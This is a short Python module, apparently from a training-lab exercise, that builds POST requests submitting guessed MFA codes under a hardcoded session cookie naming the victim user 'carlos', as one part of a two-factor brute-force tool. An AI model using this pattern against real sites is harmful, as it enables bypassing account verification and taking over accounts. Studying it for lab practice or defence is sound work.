
import requests

from data import RequestFields, ResponseInfo
import modifiers


class Requestor:
    def __init__(self, url):
        self._url = url
        self._modifiers = []

    def make_request(self, value_set):
        request_fields = RequestFields(self._url)
        request_fields.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        request_fields.headers['Cookie'] = 'verify=carlos; session=Gb3h45NCejKirXHx9N7OyXuwDIBwsOpC'
        request_fields.data = f'mfa-code={value_set}'

        for modifier in self._modifiers:
            if isinstance(modifier, modifiers.RequestModifier):
                modifier.modify(request_fields)

        response = requests.post(
            request_fields.url,
            headers=request_fields.headers,
            data=request_fields.data
        )

        return self._build_response_info(response, value_set)

    def _build_response_info(self, response, value):
        result = ResponseInfo()
        result.status_code = response.status_code
        result.content = response.text
        result.value = value
        return result
